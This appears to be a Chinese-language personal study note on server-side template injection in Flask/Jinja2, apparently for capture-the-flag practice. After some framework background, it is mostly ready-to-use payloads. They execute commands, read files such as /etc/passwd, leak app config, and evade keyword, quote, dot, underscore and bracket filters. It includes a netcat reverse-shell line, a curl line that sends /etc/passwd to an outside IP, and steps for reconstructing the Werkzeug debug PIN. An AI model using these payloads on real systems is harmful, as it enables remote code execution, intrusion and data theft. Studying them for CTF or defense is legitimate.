## **模板引擎**：

**可以在标签中写入变量，js**。**可以将后端框架传递的数据渲染为**html。常用的引擎(jinja2)允许html文档插入模板。使用了引擎的html就是**模板文件**。

**{{ }}为变量**，{% %}**为js语句**

## **web框架**：

内置功能：框架通常包含大量内置功能，如**路由**、**会话管理**、**表单验证**、**文件上传**、邮件发送等

框架的参数通常通过添加变量，设置动态url

```python
@flask_name.route('/path/<var_name>')
```

***

## python：

### flask

#### 介绍

相关配置

**flask**(jinja2):
自带服务器，不需要apache等。

```python
from flask import Flask   #导入Flask模块，可以使用Flask框架
app = Flask(__name__)	#创建一个名为app的Flask应用程序实例，__name__表示当前模块的名称。
@app.route('/')	#路由，访问根url(/)时，因执行下面的函数
def index():
    return "index" 
@app.route('/hello')
def	hello():
    return "hello"
if __name__=='__main__' 	#检测当前模块是否作为主程序执行
app.run(host="",debug=True)
```



动态url参数

```python
@app.route('/<name>')
def name(name):
	return "my name is %s" % name
@app.route('/<int:age>')
def age(age):
    return "my age is %d" %age
```

表单参数提交

```python
@app.route('/login',methods=['POST','GET'])
def login():
    if request.method=='POST':
        print(1)
```

 

* run()

| 参数名 | 说明       |
| ------ | ---------- |
| port   | 开启的端口 |
|        |            |

#### 属性

| 参数名            | 说明                                                    |
| -------------- | ----------------------------------------------------- |
| _\_class\_\_   | 当前对象的类                                                |
| \_\_bases_\_   | 当前类的父类                                                |
| _ base _       | 对象的直接基类                                               |
| _ mro \_\_     | 当前类的链<br />储存在数组中                                     |
| _  globals\_\_ | 每个函数都有这个属性，包含这个函数在定义时所在作用域(定义函数的文件)所有的变量。以字典形式存储      |
| _ dict _       | 包含类的静态函数、类函数、普通函数、全局变量以及一些内置属性的字典。                    |
| _ builtins _   | 是内置模块的一个引用，包括了命名空间的函数，异常和其它内置对象等，每个命名空间都有一个builtins模块 |

* \_\_globals__
```python
  import os
  import time
  def hello():
      print("Hello, world!")
```


```python
hello.__globals__:
{
'os': <module 'os'>,
'time': <module 'time'>,
'hello': <function hello>,
'__name__': 'myapp.utils',
  ...
 }
```

* \_\_builtins__

  > python环境内置的许多函数popen,system等，这些都在_builtins\_模块里。
  > 所以在\_globals\_里，找\_builtins\_模块。再使用这些函数

#### 魔术方法

| 魔术方法             | 说明                                                |
| -------------------- | --------------------------------------------------- |
| _ init_(self,value)  | 初始化类的构造函数，返回function                    |
| __ getitem __()      | 定义对象的索引访问行为。根据索引返回值。可用pop代替 |
| __ getattribute __() | 动态获取对象属性                                    |
| __call\_\_()         | 允许对象像函数一样被调用                            |

#### 内置方法

| 内置方法                     | 说明                                                 |
| ---------------------------- | ---------------------------------------------------- |
| _  subclasses _()            | 当前类的所有子类                                     |
| getattr(object,name,default) | 获取对象object的属性name的值,如果不存在就返回default |
| __str\_\_()                  | 返回描述对象的字符串                                 |
| __import\_\_()               | 动态加载函数,导入模块                                |

#### 函数

| 内置函数              | 说明                               |
| --------------------- | :--------------------------------- |
| lipsum()              | 加载的第三方函数库                 |
| url_for()             | 返回url地址.可以获取`__builtins__` |
| get_flashed_message() | 可获取消息.也可获取`__builtins__`  |
| select()              |                                    |

#### 对象

> 可以当作开口

| 内置对象    | 说明               |
| ----------- | ------------------ |
| cycler      | 用于循环           |
| joiner      |                    |
| namespace   |                    |
| config      |                    |
| request     |                    |
| session     |                    |
| current_app | 应用上下文全局变量 |

```python
class A
class B(A)
class C(B)
class D(B)
c = C()

c.__class__.__mro__[1].__subclasses__()
c的mor的[1]的类的子类

```

#### 过滤器

过滤器可以对变量进行处理和转换.没有参数时可以不写()
**|必须用到最后，不能中途夹杂.**

| 过滤器                 | 说明                                      |
| ---------------------- | ----------------------------------------- |
| int()                  | 转换为整形                                |
| flaot()                | 转换为浮点型                              |
| lower()                | 小写                                      |
| upper()                | 大写                                      |
| title()                | 首字母大写                                |
| capitalize()           | 首字母大写，其它小写                      |
| strip()                | 删除字符串开头结尾空白字符                |
| wordcount()            | 计算单词数量                              |
| reverse()              | 反转字符串                                |
| replace(value,old,new) | 将value中old转换为new                     |
| list()                 | 将变量转换为列表类型                      |
| string()               | 将变量转换为string类型                    |
| join()                 | 将一个序列中的参数(字典的键名 )拼接成字符 |
| attr()                 | 获取对象属性，获取值                      |
| length()               | 获取字符串长度                            |
| lipsum()               | 用于生成伪拉丁文                          |
| pop()                  | 获取键对应的值，                          |
| truncate()             | 截取字符串的指定长度；                    |
| striptags()            | 删除所有HTML标签                          |
| escape()/e             | 转义所有特殊字符                          |
| safe()                 | 禁止HTML转义                              |
| abs()                  | 返回绝对值                                |
| first()                | 返回序列第一个元素                        |
| last()                 | 最后一个                                  |
| format()               | 格式化字符串                              |
| sum()                  | 返回和                                    |
| sort()                 | 返回列表中的元素                          |
| default()              |                                           |
| startswitch(str)       | 判断是否以指定前缀开头                    |
| endswitch()            | 结尾是否指定                              |
| isalpha()              | 是否只有字母                              |
| isdigit()              | 是否只有数字                              |
| isalnum()              | 是否只有字母和数字                        |
| isspace()              | 是否只有空字符                            |
| split(str)             | 安str分割成列表                           |
| join(str)              | 用str链接                                 |
| encode(encoding)       | 编码                                      |
| decode(encoding)       | 解码                                      |

过滤器可以连用:  {{usrs|upper|lower}}

#### request

request不是python的，是flask内置的

| 关键字           | 说明                                                         |
| ---------------- | ------------------------------------------------------------ |
| request.args.ben | 获取get参数                                                  |
| request.form.ben | 获取post参数(Content-Type:application/x-www-form=urlencoded或multipart/form-data) |
| request.cookies  | 获取cookie                                                   |
| request.value.x1 | 所有参数                                                     |
| request.headers  | 请求头                                                       |
| request.data     | post传入参数(Content-Type:a/b)                               |
| request.json     | 获取host传入json参数(Content-Type:application/json)          |

***

#### 常用方法

| 方法   |                     |
| ------ | ------------------- |
| lipsum | 可直接globals找到os |
|        |                     |



#### 常用对象

##### config

可以直接{{config}}访问配置
当config被过滤，current_app相当于flask

```py
{{url_for.globals_['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

##### g

> g是一个唯一的对象，存储临时变量。

通过{{g}}获取 <flask.g of 'flask_ssti'>

##### self



***

#### 常用类 

| 类                                    | 利用函数 | 说明       |
| ------------------------------------- | -------- | ---------- |
| _Frozen_importlib_external.FileLoader | get_data | 可直接利用 |
| os._wrap_close                        |          |            |





#### 常用模块 

| 模块       | 说明           | 函数                                             |
| ---------- | -------------- | ------------------------------------------------ |
| os         | 可执行系统函数 | system(),popen()                                 |
| subprocess | 启动一个新进程 | run(),Popen().call(),check_call().check_output() |
| builtins   | 内置一些方法   | open()`、`eval()`、`exec()                       |

self.\_\_dict\_\_\._TemplateReference\_\_context.keys()可以查看当前flask有哪些函数/对象

找可利用模块时，可以用脚本，也可以先复制__subclasses _ 内容，将空格换为换行符，在查找在几行	

| globlas                                               | 利用函数                | 说明                                                       |
| ----------------------------------------------------- | ----------------------- | ---------------------------------------------------------- |
| url_for. _ globals<br />get_flashed_messages._ global | current_app.config.flag |                                                            |
| ?                                                     | `__builtins__`['eval']  | 内建函数，每个命名空间都有。可用脚本跑出类。利用eval导入os |
|                                                       |                         |                                                            |

| 模块   | 找到模块                                                     | 模块中的函数            | 说明 |
| ------ | ------------------------------------------------------------ | ----------------------- | ---- |
| ['os'] | `conifg.class.init.globals_['os']`<br />`url_for.globals_.os`<br />如果没有，可以用`_frozen_importlib.BuiltinImporter类的load_module`导入<br /><class'_frozen_importlib_external.FileLoader'>的builtins调用eval，`__import__` | [“popen"] ("ls").read() |      |

#### xss

> 也可以解析script。造成xss

```javascript
?name=<script>alert(1);</script>
```



#### pin码

在开启debug之后，可以路由 127.0.0.1:333/console 进入输入pin码的界面，如果pin码真确，可以进入后台命令交互。

生成debugger PIN的代码在__init.py文件    -->get_pin_and_cookie_name

pin码由六个参数构成
**1.username**
执行代码时候的用户名
`username=getpass.getuser()`
默认可以尝试root

**2.app的__ name __属性**
`getattr(app,"_name__",app.__class__.__name__)`
默认值为Flask

**3.modename**
app的`__module__`属性,不存在的话取类的`__module__`属性
`getattr(app,"__module__",t.cast(object,app).__class__.__module__)`

**4.mod的__ file __属性**
app.py的路径
`getattr(mod,"__file__",None)`
通过报错页面debug获取
或者默认路径:

| python | 默认路径                                                     |
| ------ | ------------------------------------------------------------ |
|        | /usr/local/lib/python*/site-packages/flask/app.pyc           |
|        | /opt/Python/flaskdebug/lib/python*/site-packages/flask/app.py |



**5.mac地址**
str(uuid.getnode())

获取:

| 操作系统 | mac地址获取                  |
| -------- | ---------------------------- |
| centos   | /sys/class/net/ens33/address |
| ubuntu   | /sys/class/net/eth0/address  |

也可以通过抓包

**6.machine_id**
get_machine_id()   不同的操作系统读取不同 

| 操作系统 | 获取                                                         | 说明                        |
| -------- | ------------------------------------------------------------ | --------------------------- |
| Linux    | cat /etc/machine-id<br />cat /proc/sys/kernl/random/boot_id  | 前者固定后者不固定          |
| docker   | cat /proc/self/cgroup                                        |                             |
| macOS    | ioreg -c IOPlatformExpertDevice -d 2                         | "serial-number"=<{ID}的部分 |
| windows  | HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid |                             |

**debug模式**

存在文件包含,文件上传漏洞,开启debug模式会报错,显示一些文件信息.`128.3.3:3333/filename/debug`

#### 绕过：

##### **{%%}绕过**：

{%%}里面是脚本，控制结构利用{{%print(""._ _ class_ \_)%}}打印内容。

```python
{% if 2>1%}Benben{%endif%}#判断是否能执行
{%print(""._class_....read())%}#payload
```

##### **无回显**

* 反弹shell

  用脚本跑{{""._class _. _base _. _subclasses _ ()['+str[i]+']. _ int _. _ globals _['popen'] ("netcat ip port").read()}}。查看cmd是否连上

* 外带注入
  可以用wget 。也可以用dnslog /nc

  ```
  {{"".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("curl 120.23.1/`cat/etc/passwd`").read()}}
  ```

  

* 纯盲注

##### 绕过中括号[]过滤

 __ getitem__()魔术方法：
对**字典**使用，传入**字符串**，返回字典对应**键对应的值**
对**列表**使用时，传入**整数**返回列表对应**索引的值**

```python
{{"".__class__.__base__.__subclasses__().__getitem__(int id).__init__().__blobals__.__getitem__('popen')('cmd').read()}}
```

##### 单双引号过滤

* 将要引号参数用get/post的方法提交.

```python
{{=.__class__.__base__.__subclasses__()[id].__init__.__globals__[request.args.key](request.args.cmd).read()}}
#并传递参数:key=popen&cmd=cat /etc/passwd
```

* 用{\%%\}将字符串存储在变量里
  {%set a=%}{=}

##### 下划线过滤

* **request 加 attr()绕过**

  ```python
  {{()|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)('popen')('cmd')|attr('read')()}}
  ?cla=__class__&bas=__base__&sub=__subclasses__&ini=__init__&glo=__globals__&geti=__getitem__
  ```

  

* **编码绕过**(Unicode)

* **16位编码**

##### 点过滤

* **[]绕过**.被过滤用[]绕过。[]和.一样可以访问对象的属性。

  ```python
  {{‘['__class__']['__base__']['__subclasses__'](id)['__init__']['__globals__'](id)('cmd')['read']()}}
  ```

  

* **attr()**绕过

  ​	和下划线类似

##### 关键字绕过

过滤了 class arg form value init 等

* **字符编码绕过**

* **+拼接**绕过

  ```python
  {{()['__cl'+'ass__']}}
  ```

  

* 用**jinja2的 ~** 拼接绕过

  ```python
  {%set a="__cl"%}{%set b="ass__"%}{{a~b}}
  ```

  

* 利用**过滤器**(reverse replace join)
  **reverse:**

  ```python
  {%set a= "__ssalc__"|reverse%}{{a}}
  ```

  **replace**:

  ```python
  {%set a="__clabb__"|replace(a,b,s)%}{{a}}
  ```

  **join**:

  ```python
  {%set a=dict('__cl','ass__')|join%}{{()a}}
  {%set a=['__cl','ass__']|join%}{{a}}
  ```

  

* python 的**char()**

  ```py
  {%set chr=url_for.__globals__['__builtins__'].chr%}
  ```

##### 数字过滤

* 过滤器length

  ```python
  {%set a = 'aaaaaa'|length%}{{a}}       #6
  {%set a = 'aaaaaa'|length*'aaa'|length%}{{a}}      #|的运算等级高于*    6*3=18
  ```

##### 获取符号绕过

```python
{%set ben=({}|string()|list)%}{{ben}}#获取下划线
{%set a=(self|string())%}{{a}}#获取空格
{%set a=(self|string|urlencode)%}{{a}}#百分号
{%set a=(app.__doc__|string)%}{{a}}
{%set a=(self|list()|string()|)%}{{a[id]}}
#转为list，然后调用list方法pop弹出想要的字符 |list.pop(24),这里用 |list|attr('pop')(24)
```

#### payload

##### 无过滤

```python
"".__class__.__base__.__subclasses__()[161].__init__.__globals__["popen"]("ls").read() #一般链

{{lipsum.__globals__['os']["popen"]("ls").read()}}

lipsum.__globals__["os"]["popen"]("ls").read()  

self.__dict__._TemplateReference__context.keys()   #查看当前flask的所有变量键，函数/对象等

''.__class__.__mro__[1].__subclasses__()[135].__init__.__globals__.__builtins__["open"]("D:/flag.txt").read() #读文件
{{''.__class__.__mro__[1].__subclasses__()[135]('a','/').get_data('D:/flag.txt')}} #get_data是FileLoader下的方法，可以直接通过索引调用，返回二进制，getdata是实例方法，需要先建一个再调用getdata

code={{"".__class__.__base__.__subclasses__()[100].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}#没有os利用eval {含有impoetlib因该都行}导入

{{''.__class__.__base__.__subclasses__()[128]["load_module"]("os")["popen"]("ls /").read()}}# <class '_frozen_importlib.BuiltinImporter'>类

{{"".__class__.__mro__[1].__subclasses__()[29].__call__(eval,'os.system("ls")')}}

{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']}}

{{''.__class__.__base__.__subclasses__()[128]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}

#getshell
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

```



##### {{}}过滤

```python
#判断：{%if 2>1%}ssti{%endif%}
	  #{%if "".__class%}ssti{%endif%}
{%print("".__class__.__base__.__subclasses__()[id].__init__.__globals__['popen']('cmd').read())%}
```

##### 符号过滤

```python
# ’ “
code={{().__class__.__base__.__subclasses__()[].__init__.__globals__[request.args.po](request.args.cnnd).read()}}#  ?po=popen&cnnd=cat /ect/passwd

code={{().__class__.__base__.__subclasses__()[].__init__.__globals__[request.form.po](request.form.cnnd).read()}}&po=popen&cnnd=ls#post提交

#[ ]
code={{"".__class__.__base__.__subclasses__().__getitem__(id).__init__.__globals__.__getitem__('popen')('cmd').read()}}

#.
code={{""['__class__']['__base__']['__subclasses__']()[133]['__init__']['__globals__']['popen']('ls')['read']()}}

# [ ]  .
code={{""|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(133)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('ls')|attr('read')()}}

#[ ]  . _
{{""|attr('\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f')|attr('\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f')|attr('\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f')()|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')(140)|attr('\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f')|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('popen')('ls')|attr('read')()}}#用attr获取被编码的值。先写好payload，再编码

# ' " _ [ ]
code={{()|attr(request.args.clas)|attr(request.args.base)|attr(request.args.subclas)()|attr(request.args.geti)(133)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.po)(request.args.cmd)|attr(request.args.read)()}}
#传参clas=__class__&base=__base__&subclas=__subclasses__&geti=__getitem__&init=__init__&globals=__globals__&getitem=__ge
titem__&po=popen&cmd=ls&read=read

#' " + . [ ]
code={%set a=dict(__class__=1)|join%}{%set b=dict(__base__=1)|join%}{%set c=dict(__subclasses__=1)|join%}{%set d=dict(__getitem__=1)|join%}{%set e=dict(__init__=1)|join%}{%set f=dict(__globals__=1)|join%}{%set g=dict(popen=1)|join%}{%set h=dict(read=1)|join%}{%set i=dict(ls=1)|join%}{%set j=dict(read=1)|join%}
#{%set block={}|select()|string()|attr(d)(10)%}  空格
#i=(dict(cat=1)|join,block,dict(flag=1)|join)|join 读取flag
{{()|attr(a)|attr(b)|attr(c)()|attr(d)(133)|attr(e)|attr(f)|attr(d)(g)(i)|attr(j)()}} 

#' " _ 0-9 . [ ] \
{%set po=dict(p=a,op=a)|join%}{%set twentyfore=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}{%set underline=lipsum|string|list|attr(po)(twentyfore)%}{%set global=(underline,underline,dict(glo=a,bals=a)|join,underline,underline)|join%}{%set builtin=(underline,underline,dict(buil=a,tins=a)|join,underline,underline)|join%}{%set geti=(underline,underline,dict(getit=a,em=a)|join,underline,underline)|join%}{%set eva=dict(ev=a,al=a)|join%}{%set impot=(underline,underline,dict(imp=a,ort=a)|join,underline,underline)|join%}{%set os=dict(os=a)|join%}{%set pope=dict(p=a,open=a)|join%}{%set ls=dict(ls=a)|join%}{%set read=dict(read=a)|join%}{{lipsum|attr(global)|attr(geti)(builtin)|attr(geti)(eva)(impot)(os)|attr(pope)(ls)|attr(read)()}}




```

##### 关键字过滤

```python
#编码，看上一个

#+连接
code={{""|attr('__cl'+'ass__')|attr('__ba'+'se__')|attr('__subc'+'lasses__')()|attr('__get'+'item__')(133)|attr('__in'+'it__')|attr('__glo'+'bals__')|attr('__geti'+'tem__')('pop'+'en')('ls')|attr('rea'+'d')()}}

code={{""['__cla'+'ss__']['__ba'+'se__']['__subc'+'lasses__']()[133]['__in'+'it__']['__gl'+'obals__']['po'+'pen']('ls')['re'+'ad']()}}
	
#~拼接
code={% set a="__cla"%}{% set a1="ss__"%}{% set b="__ba"%}{% set b1="se__"%}{% set c="__subcl"%}{% set c1="asses__"%}{% set d="__geti"%}{% set d1="tem__"%}{% set e="__ini" %}{% set e1="t__"%}{% set f="__globa"%}{% set f1="ls__"%}{% set g="__geti"%}{% set g1="tem__"%}{% set h="pop"%}{% set h1="en"%}{{""[a~a1][b~b1][c~c1]()[d~d1](133)[e~e1][f~f1][g~g1](h~h1)("ls")['read']()}}

#reverse
code={% set a="__ssalc__"|reverse %}{%set b="__esab__"|reverse%}{%set c="__sessalcbus__"|reverse%}{%set d="__metiteg__"|reverse%}{% set e="__tini__"|reverse%}{% set f="__slabolg__"|reverse%}{%set g="nepop"|reverse%}{{""[a][b][c]()[d](133)[e][f][g]('ls')['read']()}}

code={{""["__ssalc__"|reverse]["__esab__"|reverse]["__sessalcbus__"|reverse]()[133]["__tini__"|reverse]["__slabolg__"|reverse]["nepop"|reverse]('ls')['read']()}}
 
#replace
code={{""["__claAss__".replace("A","")]["__baFse__"|replace("F","")]["__subclGasses__"|replace("G","")]()[133]["__iniFt__"|replace("F","")]["__globSals__"|replace("S","")]["popFen"|replace("F","")]('ls')["read"]()}}

#join
code={{""[dict(__cla=1,ss__=1)|join][dict(__ba=1,se__=1)|join][dict(__subcla=1,sses__=1)|join]()[133][dict(__ini=1,t__=1)|join][dict(__glob=1,als__=1)|join]['popen']('ls')['read']()}}

#char()


#__init__绕过

```

##### config

```python
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

##### pin

```python
#unsername
getpass.getuser
文件读取/etc/passwd
#appname
默认Flask
getattr(app,"__name__",app.__class__.name) 
#modname  
默认flask.app
getattr(mod,"file",None)
#moddir，也就是app.py的路径
getattr(mod,"__file__",None）
实际通过文件读取，报错获得


#machine_id
#docker就后连个链接，非docker就三个
LINUX
cat /etc/machine-id
cat /proc/sys/kernl/random/boot_id

WINDOWS

DOCKER
cat /proc/self/cgroup 

MAcOs
ioreg -c IOPlatformExpertDevice -d 2

#uuidnode/当前网络的mac的10进制
uuid.getnode()
通过/sys/class/net/eth0/address得到hex
```

### Mako

***

## java：

### Freemarker

### Velocity



***

## php：

### smarty

### Twig

## Ruby

### ERB

***



## 判断是哪种模板

![在这里插入图片描述](https://img-blog.csdnimg.cn/e3a8694618854d2788a32fecebbd8aa8.png#pic_center)

![1344396-20200911174631687-758048107](D:\picture\node\1344396-20200911174631687-758048107.png)
